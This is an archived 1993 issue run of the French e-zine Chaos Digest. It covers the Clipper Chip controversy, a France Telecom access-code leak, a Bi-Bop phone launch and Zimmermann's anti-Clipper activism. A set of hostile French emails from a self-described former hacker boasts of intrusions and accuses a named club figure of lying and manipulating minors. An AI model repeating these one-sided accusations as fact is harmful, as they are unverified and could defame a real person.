By: RORY J. O'CONNOR, Mercury News Staff Writer
Edition: Morning Final  Section: Business  Page: 11D

Civil  libertarians  and  a  major  computer industry group raised concerns
Friday about how much protection a Clinton administration plan would afford
private   electronic  communications,  from  cellular  telephone  calls  to
computer data.

  The  administration Friday said it would begin using technology developed
by  the  government's  National  Institute  of  Standards and Technology to
balance  two  competing  interests:  the  desire  of citizens to keep their
conversations  private and the need for law enforcement agencies to monitor
those conversations after getting a court order.

The  technology  that   enables this is a computer chip called the  Clipper
Chip   that  scrambles a  telephone call or computer message using a secret
algorithm, or formula.

  But  each  chip also comes with a pair of electronic "keys" that could be
used  by law enforcement agencies to decipher the secret messages generated
by the chip.

  The Clinton proposal calls for one key to be held by each of two separate
"trusted" third parties, who would release them to law enforcement agencies
that  obtained  legal  authority to intercept the communications. Both keys
would be needed to decipher a message.

  The  Electronic  Frontier  Foundation,  a  not-for-profit civil liberties
group,  praised  the  administration  for  considering  the  issue.  But it
criticized the lack of public input into the plan.

  "They've announced a big inquiry with public input, but they've reached a
conclusion before they started," said Daniel J. Weitzner, staff counsel for
the Washington-based foundation.

  Although  the  administration's  plan calls only for equipping government
telephones  with  the  security devices, some groups are concerned the plan
might  become  a standard for all manner of electronic communication before
the public has a chance to debate its merits.

  "I  don't  want to sound too stridently opposed to this," said Ken Wasch,
executive   director  of  the  Software  Publishers  Association  (SPA)  in
Washington. "But... we feel blindsided."

  The  SPA  was discussing data security issues with Clinton administration
officials  but  had  not  expected any  White   House  action until August,
said Ilene Rosenthal, general counsel.

  Besides the lack of initial hearings, both groups said they had two major
concerns about the Clinton plan:

  (box)  Because  the  algorithm  itself  is  secret,  the groups say it is
impossible  for the public to discern if it is truly secure. Users can't be
certain  government  spy  agencies  have  not  hidden  a "back door" in the
software that will allow them to read anything they want.

  "So  far there hasn't been a credible explanation about why the algorithm
has to be secret," Weitzner said.

  (box)  The  administration  hasn't decided who will be the escrow agents,
and  it  seems  unlikely  any  government agency, corporate entity or other
organization would be deemed trustworthy by every user.

  Even  assuming  all  concerned  can  agree  on  who will hold them, civil
libertarians  are  concerned  that  the  keys,  by  giving  law enforcement
agencies access to individuals' private communications, might pose a threat
to constitutional protections against self-incrimination.

   Washington sources who requested anonymity suggested the  White    House
might  have  drafted  its  plan quickly because of concern over sales of an
AT&T  device  that  encrypts  phone  calls  using  an  older standard, Data
Encryption  Standard. The sources said law enforcement officials feared the
device  would  create  an explosion in secured telephone traffic that would
severely hamper their efforts to wiretap calls.

  American Telephone & Telegraph announced Friday it would adapt the $1,200
product,  called the Telephone Security Device, to use the  Clipper    Chip
by  the  end  of  this  fiscal  quarter. AT&T makes a related device, which
encrypts  voice and computer data transmissions, that could be converted to
the Clipper technology, said spokesman Bill Jones.

  Jones  said  he  wasn't  aware  of any concern by the government over the
current  model  of  the  Telephone  Security Device, which has been sold to
government and business customers.

  At least one company was quite pleased with the plan: San Jose chip maker
VLSI  Technology,  which  will  manufacture  the   Clipper    chips   for a
Torrance company that is selling them to the government and to AT&T.

  VLSI,  which  invented  a  manufacturing method the company said makes it
difficult  to "reverse engineer" the chip or discern the encryption scheme,
expects  to  make  $50  million in the next three years selling the device,
said Jeff Hendy, director of new product marketing for the company.

------------------------------

Date: Thu Apr 15 11:47:00 +0200 1993
From: createuraltern.com (Fabien Pigere )
Subject: File 5--Piratage France Telecom par un technicien France Telecom
Copyright: Elsevier Science Publishers Ltd., 1992

ADDING TO CHAOS
Network Monitor      March, 1992
ISSN: 0953-8402               WORD COUNT: 121
PUBLISHER:  Elsevier Advanced Technology Publications

France  Telecom was in the news again recently after a technician was found
guilty  of  aiding  hackers  to  gain information about using international
network connections.

The  technician  worked for Intelcom France, an FT subsidiary which manages
the international transit node (NTI) for France Telecom networks.

According  to  the  police  the technician "played a determine role" in the
leak of NTI access codes notably to the Chaos Computer Club France.

Jean-Bernard Condat of the CCCF denied the accusation that his organization
which he says specializes in the security of information systems,  received
the access codes from the technician.

The  Chaos  Computer  Club  began life in Germany and has played a twilight
role,  half  supporting hackers and half finding security loopholes ignored
or hidden by suppliers and operations.

INDUSTRY:  Telecommunications (TL)

------------------------------

End of Chaos Digest #1.19
************************************

Chaos Digest               Lundi 26 Avril 1993          Volume 1 : Numero 20

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.20 (26 Avril 1993)
File 1--Bi-Bop a Paris: premier telephone mobile
File 2--Philip Zimmerman nous parle de "Clipper Chip"
File 3--Doit-on reedite "The Cult of Information" de Roszak?
File 4--Petit pirate francais cherche pirates desesperement (poesie)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

From: jbcondat (Chaos Computer Club France )
Date: 23 Apr 93 13:59:59 GMT
Subject: File 1--Bi-Bop a Paris: premier telephone mobile
Repost from: telecom13.275.1@eecs.nwu.edu


PRESS RELEASE
PRODUCT AVAILABLE APRIL 26TH, 1993

From: France Telecom
      International Press Office
      Mr. Stephane Barbe
      Phone: +33 1 44 44 42 27
      Fax: +33 1 46 56 14 74

Bip-Bop in Paris: France Telecom launches the first mobile pocket telephone

     Bi-Bop, the new digital cordless pocket phone, will begin reaming
the streets of Paris on April 26th, France Telecom has extended
commercial service to the French capital following successful pilot
service in the city of Strasbourg.

     Bi-Bop is the first-generation pocket phone.  The lightweight
terminals (about 180 grams) are the size of a calculator.  They are
used to call from anywhere within 50 to 200 meters of radio base
stations installed in public places throughout Paris and Strasbourg.
Some 3,000 base stations are already in place in Paris proper and nearly
suburban areas.  The network now covers most of the capital and all major
thoroughfares and business districts.

     Beginning this fall, the French system will mark an important advance
since Bi-Bop subscribers will also be used to receive calls in public places
on any model terminal, thanks to the "Bi-Bop Reponse" option telephone type.

     Bi-Bop offers three phones in one, since in addition to its public
roaming possibilities, it can also be used as a cordless phone at home, or
for people on the move at the workplace.  At a business site, the phones
are linked to a private base station or to the company's own PBX.

     Bi-Bop is conform to the CT2 international standard, meaning that
subscribers can also use it during foreigh travel.  The telephones integrate
a number of advanced features, such as last number redial and a 15 number
memory for abbreviated dialing.

     Bi-Bop telephones will be sold at France Telecom ageneles for FRF
1,890 (including VAT).  The Bi-Bop subscription rate is FRF 54,50 per month
(FRF 45,95 excl. VAT).  Calls made from public areas anywhere in the Bi-Bop
coverage zone are billed FRF 0,88 (FRF 0,70 excl. VAT) per minute, in
addition to the normal telephone rate.  For example, a one minute call
using a Bi-Bop phone from Paris to Marseille would cost FRF 3,40 including
VAT. There is no surcharge for Bi-Bop calls from the home or workplace.

     Development and installation of the pilot network has been contracted
to Dassault A.T., which leads a consortium with three other firms: Cap Sesa,
Electronique Mecelec et Monetel SA.  Bi-Bop terminals made by four manufac-
turers have been approved for use: Sagem, Matra Communication, Dassault A.T.
and Motorola.

     With the new Bi-Bop service in Paris, France Telecom further broadens
its range of mobile services, ushoring in a new area of personal
communications.

------------------------------

Date: Sat, 24 Apr 93 01:03:53 PDT
From: atfurman@cup.portal.com (Alan T. Furman )
Subject: File 2--Philip Zimmerman nous parle de "Clipper Chip"
Repost from: alt.security.pgp


Here are some ideas for those of you who want to oppose the White House
Clipper chip crypto initiative [see ChaosD #1.19].  I think this is going
to be a tough measure to fight, since the Government has invested a lot of
resources in developing this high-profile initiative.  They are serious
about it now.  It won't be as easy as it was defeating Senate Bill 266 in
1991.

Possible actions to take in response:

1. Mobilize your friends to to all the things on this list, and more.

2. Work the Press.  Talk with your local newspaper's science and technology
   reporter.  Write to your favorite trade rags.  Better yet, write some
   articles yourself for your favorite magazines or newspapers.  Explain why
   the Clipper chip initiative is a bad idea.  Remember to tailor it to your
   audience.  The general public may be slow to grasp why it's a bad idea,
   since it seems so technical and arcane and innocent sounding.  Try not to
   come across as a flaming libertarian paranoid extremist [*Moi?* -- ATF],
   even if you are one.

3. Lobby Congress.  Write letters and make phone calls to your Member of
   Congress in your own district, as well as your two US Senators.  Many
   Members of Congress have aides that advise them of technology issues.
   Talk to those aides.

4. Involve your local political parties.  The Libertarian party would
   certainly be interested.  There are also libertarian wings of the Democrat
   and Republican parties.  The right to privacy has a surprisingly broad
   appeal, spanning all parts of the political spectrum.  We have many
   natural allies.  The ACLU.  The NRA.  Other activist groups that may
   someday find themselves facing a government that can suppress them much
   more efficiently if these trends play themselves out.  But you must
   articulate our arguments well if you want to draw in people who are not
   familiar with these issues.

4. Contribute money to the Electronic Frontier Foundation (EFF) and Computer
   Professionals for Social Responsibility (CPSR), assuming these groups
   will fight this initiative.  They need money for legal expenses and
   lobbying.

5. Mobilize opposition in industry.  Companies that will presumably develop
   products that will incorporate the Clipper chip should be lobbied against
   it, from within and from without.  If you work for a telecommunications
   equipment vendor, first enlist the aid of your coworkers and fellow
   engineers against this initiative, and then present your company's
   management with a united front of engineering talent against this
   initiative.  Write persuasive memos to your management, with your name
   and your colleagues' names on it.  Hold meetings on it.

6. Publicize, deploy and entrench as much guerrilla techno-monkeywrenching
   apparatus as you can.  That means PGP [see ChaosD #1.18], anonymous mail
   forwarding systems based on PGP, PGP key servers, etc.  The widespread
   availability of this kind of technology might also be used as an argument
   that it can't be effectively suppressed by Government action.  I will also
   be working to develop new useful tools for these purposes.

7. Be prepared to engage in an impending public policy debate on this topic.
   We don't know yet how tough this fight will be, so we may have to
   compromise to get most of what we want.  If we can't outright defeat it,
   we may have to live with a modified version of this Clipper chip plan in
   the end.  So we'd better be prepared to analyze the Government's plan, and
   articulate how we want it modified.

Philip Zimmermann

------------------------------

Date: 23 Apr 1993 23:57:02 GMT
From: woody@cats.ucsc.edu (William Edward )
Subject: File 3--Doit-on reedite "The Cult of Information" de Roszak?


The University of California Press is considering re-releasing a book
on computers, people, and information, which has gone out of print.
The book is called _The Cult of Information_; its author is Theodore
Roszak.  It was originally published in 1986 by Pantheon Press.

UC Press doesn't have Internet access, so I've been asked to gather
opinion from people on Usenet...  Pro or con...  Should the book be
re-released?  The new edition would be in paperback form, and priced
in the $10-$12 range.  It would contain a new author's preface,
addressing issues of the past seven years.

U.C. Press is interested in any comments folks may have, and
specifically ones on the following issues:

     * What is the potential market?
     * Would the book be appropriate for classroom use in any kinds of
       college courses?
     * General impressions of the quality, accuracy, and insightfulness,
       or lack of those characteristics, present in the book;
     * How could the book be publicized so as to best reach those who
       would be interested in having a copy?

Obviously, these questions are more easily answered if you've read or
know of the book. I've included the table of contents and some of the
back and front matter, to appease everyone else's curiousity.

Please respond by mail to woody@zocalo.com, rather than by follow-up
here.  Thank you.
_____________________________________________________________________________
bill woodcock|woody@zocalo.com|woody@applelink.apple.com|woody@ucscb.ucsc.edu

+++++
Other books by Theodore Roszak:

    _Person/Planet_
    _Unfinished Animal_
    _Where the Wasteland Ends_
    _The Making of a Counter Culture_
    _The Dissenting Academy_
    _Masculine/Feminine_
    _Sources_
    _Dreamwatcher_
    _Bugs_
    _Pontifex_

About the Author:

    Theodore Roszak, acclaimed author of _The Making of a
    Counter Culture_, has twice been nominated for a National
    Book Award. He is professor of history and chairman of
    general studies at California State University, Hayward.

Table of Contents:

    Introduction

    "Information Please"
        Information old-style
        Enter UNIVAC
        Cybernetics and the secret of life
        The biocomputer

    The Data Merchants
        High tech and the conservative opportunists
        Sunbelt politics and the warfare state
        Megahype
        Hackers and hucksters
        Silicon and natural selection
        Technophilia

    The Hidden Curriculum
        The chimera of computer literacy
        A solution in search of problems
        The computerized campus
        Power and dependency
        A private universe

    The Program Within the Program
        The case of Logo

    Of Ideas and Data
        Ideas come first
        The master ideas
        Experience, memory, insight
        The empiricist gambit
        No ideas, no information

    Computers and Pure Reason
        The light in Plato's cave
        The old mathematical magic
        The seductions of software
        An alien intelligence
        The flight from reality
        The fifth generation... and beyond

    The Computer and the Counterculture
        Big Blue and the guerrilla hackers
        An electronic populism
        The heroic age of the microcomputer
        Reversionaries and technophiles
        Domes, data, and dope
        Decline and fall

    The Politics of Information
        Nothing but the facts
        Data glut
        Issues before information
        Online communities: the promise of networking
        The public library: the missing link of the information age

    In The Wrong Hands
        The foundations of information technology
        The surveillance machine
        The polling machine
        The war machine
        _Machine `a gouverner_
        At the limits of sanity: the psychotic machine

    Descartes's Angel
        Reflections on the true art of thinking

    Notes

    Index

------------------------------

Date: Differentes et precisees dans le fils de l'article
From: langlois@ciril.fr (Langlois Ph. )
Subject: File 4--Petit pirate francais cherche pirates desesperement (poesie)


Date: Tue Jun 09, 1992  5:31 am  EST
Subject: Re:  Ta visite au CCCF

Hi!!!

     Salut THierry, puisque c'est toi qui m'a ecrit la derniere fois...

Eh bien, mond adr:
NET
6 rue du Boillet
18000 BOURGES

Autrement, eh bien, les smiley faces c'est
:-)
:)
;)
;-)
8-)
8)
<)    (the chineese one!)
*:)   (elton john)
:->
:o>    (the clown)

V: ==DST
Les [V]isiteurs qui viennent te reveiller chez toi a 6 heures du mat...

Pour la securite info:

Moi je m'en fou pour mon adr etc... J'ai arrete le Hacking ya plus d'un an.
Depuis, je fais de rech. en sec info... c tout...

Merci pr CuD...
Mais bon, les infos la dedans sont vraiment pas *ELITE* ;-) huhuhuhu...

Bref, t'es nouveau de combien de semaines au CCCF thierry???
Tu y fais quoi???
C'est combien l'adhesion?

A+

oooopppsss.... J'ai oublie de repondre a une question:
Ma venur:
merde: venue venue    (si tu connais le C-Shell, tu comprendras!!!)
Bon, eh bien, quand je monterais a Paris, on pourra se voir (je vais jamais
a Lyon, jamais eu l'occasion de +)

Pour Bourges:
Oui, il y a bcp de Langlois et meme si tu accedais a la liste rouge tu me
trouverais pas!!!!

Allez salut... j'ai 20 msg a repondre encore...

+++++

Date: Sun Jun 14, 1992 10:43 am  EST
Subject: Re:  Ta visite au CCCF

Salut Thierry,
Ok, thanx pr les reponses...

>pourquoi de parle c-shell?
Ca simplifie la vie.... Ca va plus vite... et ca selectionne deja les
elites, m8 des la.. ;-]
>adhesion au club:
cooptation? Explain me pweez!
Pourquoi juste 72 membres????

>chef d'oeuvre:
C'etait quoi ton chef d'oeuvre?
Ce sont des chefs d'oeuvres de quel type? Programmation? Passe? ctc?
infiltration?
;-)

>adresse confidentielles:
Ca sert a quoi vu que les RG et la DST ont certainnement toutes les info
su les adherents jusqu'a la couleur de tes chaussettes?

>est ce vrai que JCB fait partie de l'extreme droite?
J'ai deja lu ca... jamais de reponse.... moi j'aimerai bien avoir une reponse.

Bon bon...
Dommage qu'on puisse pas se voir...

Ah merde... j'ai oublie de parler de 2 ou 3 trucs:

Pour les bugs Unix, vous m'avez toujours pas repondu... sur quels systemes
en possedez vous?

Vous avez quoi comme matos au CCCF ???

c ya!

PS: mon prenom c Phil.

Et pour repondre a JBC, je suis toujours pas un RG et j'ai toujours pas
vu ce fameux RG usurpant mon pseudoo...

+++++

Date: Sat Jan 23 00:09:28 +0100 1993
Suject: alors, pas mort???

Oh zut.... moi qui m'attendait a recevoir un de tes foutus Mailing hihihihi...
Bin alors???? Ton reseau d'information n'est pas si au point que cela pour
ton club fantoche???

Ah lala... Poovre JBC, j'espere que tu te balades pas trop sur les chats de
l'Internet avec un psuedo type JBC ou CCCF etc... hihi, come tu dois
te faire incendier...
Deja, dans Phrack 41, c'est pas mal... mais bon... yen a des meilleures qui
doivent arriver a ce que j'entend dire!

Au fait... toi qui a des amis "hauts places", hummm... d'apres uns source
sure, ces 'amis, tu es sur que TU les utilise et pas le contraire?

Allez salut...

ps: Chaos Digest: tres tres mauvais... ca pue carrement meme! arrete...
    Tu crois que t'es deja pas deja assez enfonce comme ca?

 Bye bye, pour de bon cette fois ci.
Et ne soit pas parano sur les reseaux, tes ennemis sont bien plus proches
de toi que tu ne le crois!

+++++

Date: Sat Jan 23 23:38:14 +0100 1993
Subject: Re: alors, pas mort???

Salut Arnaud, (si entre temps, Bernard, Rene, Henri ou Alexandre n'ont pas
pris ta place!) ;-)

     Ah bon??? JBC n'est plus au CCCF depuis septembre 1991????
hoho... (euh, tu m'expliques pourquoi le nom de ton Email c'est jbcondat???
Il paye encore vos facture...
non?

Au sujet de Phrack 41:
C'est ptet cela votre probleme: vous lisez tellement en diagonale que vous
deformez tout!

Reproche a JBC:
(si mes doutes sont fonde et que ce n'est qu'une de tes autres pseudo-ruses
que de te faire passer pour quelqu'un d'autres JB, tu vas savoir une partie
de ce que je pense...)
- Il n'est ABSOLUMENT pas honnete, aucunne honnetete intellectuelle:
   Il utilise l'anonymat du minitel pour prendre des multitudes de pseudo pour
   faire croire a l'importance du CCCF qui n'est en fait que du VENT!
   Il ment comme un arracheur de dents! ("JBC rencontre la mission du KGB en
   France", "JBC se fait mitraille a la 12.7 en descendant d'un taxi
   parisien", "JBC rencontre le premier ministre et le ministre de
   l'Interieur", "3JBC pirate le serveur videotex de la CIA" (celle la je m'en
   suis toujours pas remise hahahaha!)
- Il manipule de pauvres gosses de 15 berges qui n'ont aucune experience
- Il a vendu des personnes aux autorites contre une reduction des charge
  pour l'affaire des NUIs.
- Il organise un concours attrape-con "le prix du chaos" pour recuperer
   un max d'infos!
   Et ensuite se faire valoir grace a ces infos...
Bon, j'arrete, ca suffit je pense!
(je dis rarement quelque chose a la legere!!!)

(relis bien Phrack 41!)

Alors arnaud, es tu sous directeur general du cabinet de gestion du
secretaire principal adjoint????? Wouarffff'''
Allons allons, un peu de serieu, pourquoi vous ne clarifiez pas votre
position... Vous utilisez des methodes de **** pour promouvoir votre
club et ensuite vous voudriez que l'on vous venere...
Moi, toutes les personnes du CCCF avec qui j'ai discute sont des breles,
lamers, computer geek!!!!
Alors bon, je pense que le profile bas serais de rigueur pour un club tel que
le votre...

Chaos Digest:
C'est tout simplement pas un zine du TOUT!

Que veux tu qu'on ait a foutre d'un pauvre liste de NUA faux, courte et
ininterressants, du statu d'un club inexistant, des lettres de quelques
personnes abusees etc...????

Pffff...

Quand a la clairete de mes messages, c'est pas de ma faute si vous comprenez
pas le Francais mon cher Arnaud...

Alors Arnaud? toi aussi tu vas me repondre que vus avez des bugs sur Unix
version 13 ???? hahahaha... arretez un peu de vous prendre pour des grands:
vous etes des rigolos!

Quand aux amis hauts places, faut savoir ce que vous dites!
Arf'''' Vous vous contredisez dans 2 messages: normal, ils ne sont pas
destine a la meme personne... mais rien n'empeche d'ecouter les echos et
de mettre en correlation les evenements!

Je vous laisse, autres choses de plus important a faire que de repondre a
vos 'time-wasting messages'.

Phil, Esperant qu'un jour la verite vous ouvrira les yeux!

+++++

Date: Thu Jan 28 23:35:25 +0100 1993
Subject: Re:  >Re: alors, pas mort???

Hi,

> Mauvais ton de parler de JBC au cccf...
explique un peu ca???

> on ne le voit plus depuis un sacre bout de temps
Il y a encore moins de 3 mois, un mec se faisant passer pr JBC (pfffff.. arf)
et il avait la meme voix et les memes expressions d'obsede sexuel...
Alors arrete tes blagues STP!!!
Et apparemment, vos histoires ne sont absolument pas claire car JBC
selon certain a degote un HAUT (wouarf') poste a l'armee (genial, esperons
qu'avec une brele pareille l'armee sera moins efficace et ainsi moins destruc-
-trice.)

>JBC Mitraille...
Wouarf''' ca avait ete romance d'une autre maniere...

>JBC et la CIA...
Bin voyons... moi ya les ptits gris qui m'ont demande le mot de passe
que j'avais utilise pour penetrer dans blackbird.afit.af.mil !!! hhahahaha...

>JBC et ses diplomes:
ouais.... genialement honnete votre club alors...
Un mec nul en info s'occupe du cote relationnel de votre club et a ainsi
pour tache principale de manipuler des pauvres gosses sans defense...
Si il avait ete si bon, il aurais du essayer de me manipuler...
Quand a son soit disant Ph.D., etc.... ouhouhouh... arretez! arf

>Thierry????
Qu'est devenu celui la???? ejecte?

>j'ai ton age:
et j'ai quel age a ton avis? Si tu n'es pas JBC, n'as tu pas peur de
t'etre fait COMPLETEMENT manipule?

>Phrack 41:
2 possibilite:
1/ t'as pas phrack 41, et tu veux me pousser a te demontrer qu'il y a bien
qq chose vous concernant dans Phrack 41 en t'envoyant p41.
2/ t'as vraiment besoin d'apprendre l'americain, l'anglais, a lire et/ou
besoin de lunettes!

>Et a 0000.61 GMT le 01/02, yaura qui????????
au fait, etre au cote relationnel, c'est vraiment toujours egal a etre nul????
genial comme image de marque pour un club...

>ce que tu as fait???
Qu'est ce que j'ai fais... arf af... hackers bien sur dutrou!!!
quoi? SunOS, Ultrix, BSD, HPUX, BOS, SPIX, UnicOS, VMS...

et vous?? je n'ai JAMAIS vu une realisation concrete de votre groupe de lamer!

pffff... je vais pas prendre plus la peine d'ecrire car c'est encombrer
l'Internet pour rien...

derniere reponse:
>pour qui tu travailles?
Alors la.... hehehe... j'ai une solution hyper-simple:
POUR MOI CRETIN!!!!!!!!!!!!!!!! Rahhhhhh.... vraiment vous etes long
a la detentes "%#'$@ BASTARDs! &)*= Dumbfucks! \.-?

je prend pas la peine de corrhige le multpiles fotes d'ortograf, de sintaccs,
et de grammere!

PS: je croyais que je pouvais avoir qd je voulais ds ma boite au lettres
une carte du CCCF???? on m'a promis ca il y a au moins 6 mois, et j'ai
toujours rien... Mais c'est meme pas que vous etes nuls: VOUS ETES AVEUGLES!

+++++

Date: Sat Feb  6 17:44:18 +0100 1993
Subject: Re:  Tu as de la chance :-)

ps: ya un truc que j'ai pas bien compris... JBC n'est plus dans le CCCF???

J'ecris ou la??? jbcondat@attmail.com?????? huuuu.... c'est ptet con comme
question mais vous vivez encore sur ses economies/celles de sa boite...
(au fait, vous vouliez core-dump???? arf... donnez votre adresse que je vous
mette le numero 4!)

Bye bye.

+++++

Date: Sat Feb  6 17:42:06 +0100 1993
Subject: Re:  Tu as de la chance :-)

pffff...

vous etes rapides les mecs!

arf arf arf...

Allez mon cher stanislas xavier alexandre henri michele de machin-chose,
Je ne vous salue point en vous souhaite encore de bien bonne rigolades!

et c enkorr ds 1 msg pliiins de fotes que ze vous repondre et zi zela ne
vs ple pas, allez voirrrhh ayeur!

Moi, je n'ai plus cette chance, parce que pour rigoler, il suffisait de
se faire appeler a la cabine telephonique de notre choix et de rigoler un
bon coup en ecoutant vos conneries!

Bon, je vais pas gaspiller plus de CPU pour vous!

+++++

Date: Tue Feb  9 23:04:11 +0100 1993
Subject: Re:  Core-Dump...

Bon, reponse rapide...

Je suis pas sportif???? arf arf... c'est vous qui me dites ca???? JE REVE!

Bon, pour Core-Dump, ze vous l'aurait mis directement dans une boite au lettre
sur Paris pour eviter la poste...
Gimme 1 pweez!

La derniere reponse etait de qui aussi??? C'est pas poli ce que vous faites
;-) de mettre que vos prenom, alors que de moi vous connaissez tout! :)

Au fait, pourquoi votre premiere reaction envers tout est toujours de
critiquer (enfin, tout ce qui ne vient pas de 'vous'! arf...)

Pour le depart de JBC (soit disant depart!),
la derniere date que vous m'aviez dite etait le 1 janvier 1991, faut savoir
ce que vous dites!

Il est a vous le pseudo VIF2 sur Rtel?

Nils est il un nom qui vous dit qq chose?

Bon... que les demons de l'internet vous fasse voir ce qu'est que la vraie
"eleet!"

PS: pour reagir a mon article???? quelle raison???? d'abord c'est pas un
article DU TOUT, c'est une lettre! Si d'autres reagissent, eh bien, dites le
moi!

PS/2: "the first e-journal in France" !!!! ahahahahaha.... fuckin bastard,
le 1er E-journal est Core-Dump : 1992....

COrrigez vos fautes... issue 1 & 2 : pre 93. isseu 3: post 93, 4: pareil!

c ya l8r...

+++++

Date: Tue Feb 16 23:56:09 +0100 1993
Subject: Re:  Core-Dump...

E-journal peut qd mm etre private....

Autrement, oui je connais la DST... et oui ils sont tout puissant...
et non: je 'ai rien n'a cacher ni a eux ni a personne...
et non: je ne travaille pour personne...

est-ce suffisamment clair?

Je sais que tt ce qui passe est lu et relu par les mecs de "la tour"
qd ca passe ds l'underground... et si j'avais vraiment deconne, j'aurais
recu un rapel a l'ordre... donc je me fous un peut de tes prevision
cher Stanislas...

Au fait, quel age as tu?

c ya l8r!
Phil.

+++++

Date: Fri Feb 19 18:48:23 +0100 1993
Subject: Re:  _Core-Dump_

hiya...

  Bon. eh bien sache que moi aussi je paye mes notes (ou plutot mes parents..
et meme les contacts que j'ai eu avec la dst n'etaient ABSOLUMENT pas
pour me proposer de bosser pour autre...)

Quand au fait qu'ils ne recoivent pas chaos digest... tu te trompes
certainnement, sur 489 personne... il doit forcemment y en avoir 1 qui
est de la dst et de toute facon ils passnt au peigne fin les serveurs ftp
alors...et puis, ma ligne etant sur ecoute, du jour ou j'ai recu chaosd
(que je trouve d'une qualite ultra-mediocre btw!), eh bien ils l'ont lu
certainnement

Au fait, comment avez vous pu publier ma lettre destinee a Phrack sans
me demander expressement un accord de publication???

Core-Dump: rassure toi, je vais ne vous donner ca qu'en main propre a mon
avis... tu es la a partir du 20/02 ???

Quand au fait que jbc se serait fait enculer... RAF !!!

La tour au fait c'est pas la piscine donc la dgse, pas trop... qd a la pj,
laquelle??? (euhhh au fait, la DGSE c'est ds le 20eme, pas rue Nelaton!)

quand a mon hacking, cela fait bientot 1 ans et demi que je clame haut et
fort que j'ai arrete!

redonne ton tel pour qu'on se voit sur Paris please... c ya l8r!

Phil.

+++++

Date: Fri Feb 19 19:03:09 +0100 1993
Subject: Re:  Chaos Digest, #1.09

Oufff...

enfin une issue a moitie potable...

vous remontez dans mon estime!

c ya!

+++++

Date: Sat, 13 Mar 93 13:55:58 +0100
Subject: Re:  Chaos Digest, #1.10 (fwd)

Hahahahaha....

Parano parano....

Bienvenue en paranoia!

Tu sais, c'est pas tres dur de balancer 1 recueil de message Email, de
l'envoyer a l'EFF et de se faire "mirrorer" par une dizaine de sites FTP.

"Quantity don't make quality (...AltGer...)

--Philippe.

+++++

Date: Sat, 17 Apr 93 13:10:34 +0200
Subject: Re:  Ton precedent message

Hello....

visite dimanche ou lundi...

ohhhhh si.... je suis EXTREMEMENT TIMIDE

We'll chat a lot i think....

c ya.
leave me your phone here again please.
bye.

------------------------------

End of Chaos Digest #1.20
************************************

Chaos Digest            Mercredi 28 Avril 1993        Volume 1 : Numero 21
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.21 (28 Avril 1993)
File 1--Liste des 36xx de France Telecom
File 2--_Securite Informatique '93_ (annonce)
File 3--Nouveau virus Mac: INIT-M

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

From: jbcondat@attmail.com
Date: 26 Apr 939 06:59:59 GMT
Subject: File 1--Liste des 36xx de France Telecom
Repost from: telecom13.281.1@eecs.nwu.edu


All week, France Telecom added new direct services to the list of
special numbers beginning by {ZAB=} _36.  This new "36" numbers are
available all over the French regions with some restrictions.

Following the list of all services available April 26th:


                   LIST OF  36PQ SERVICES
                      APRIL 26TH, 1993

Number      Description of Provided Service

3600        Transpac access (1,200 baud/s)
3601        Transpac access (300 baud/s)
